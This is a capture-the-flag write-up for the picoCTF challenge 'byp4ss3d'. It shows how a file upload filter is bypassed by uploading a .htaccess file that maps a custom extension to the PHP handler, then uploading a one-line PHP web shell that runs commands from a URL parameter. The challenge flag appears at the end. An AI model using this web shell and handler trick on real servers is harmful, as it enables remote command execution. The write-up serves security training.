# byp4ss3d
- [Challenge information](#challenge-information)
- [Overview](#overview)
- [Solution](#solution)
- [Flag](#flag)
## Challenge information
```text
Tags: Web Explotation, picoMini by CMU-Africa

Description: A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded but are they enough? Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't.

Hints: 
1. Apache can be tricked into executing non-PHP files as PHP with a .htaccess file.
2. Try uploading more than just one file.
```
## Overview
### Access the link, a website that allows us to upload files will appear
![alt text](/CTF/picoCTF/Static/Images/byp4ss3d/image1.png)  

* When i try to upload any png image file  

![alt text](/CTF/picoCTF/Static/Images/byp4ss3d/image2.png)  
## Solution
**Step1:** Recon  
* Normally when I encounter this type of website I immediately think of File Upload Vulnerability.  
* I will try to upload a php malware file  
```PHP
<?php
    echo system($_GET["cmd"]);
?>
``` 
* Web returned `Not allowed!`  
* Let's try changing .php to .png and see what happens.  

![alt text](/CTF/picoCTF/Static/Images/byp4ss3d/image3.png)  
* Was able to upload, but when we accessed the website, it had been scanned for malware.  

![alt text](/CTF/picoCTF/Static/Images/byp4ss3d/image4.png)  
* I tried uploading files with different extensions than the one the web requires and it still uploads successfully.  
* It seems that only PHP files are blocked.  

**Step2:** Exploit  
* Based on hint 1: We can understand that if we upload a .htaccess file to trick the web into executing non-PHP files like PHP, it can still work.  
* We will create a .htaccess file and upload it to the web to execute files with the .hacker extension like PHP.   
```
AddType application/x-httpd-php .hacker
```  
* After uploading this file, we will rename the newly created php malware file to shell.hacker  
* Now we can execute it  
![alt text](/CTF/picoCTF/Static/Images/byp4ss3d/image5.png)  
## Flag
`picoCTF{s3rv3r_byp4ss_39f9de85}`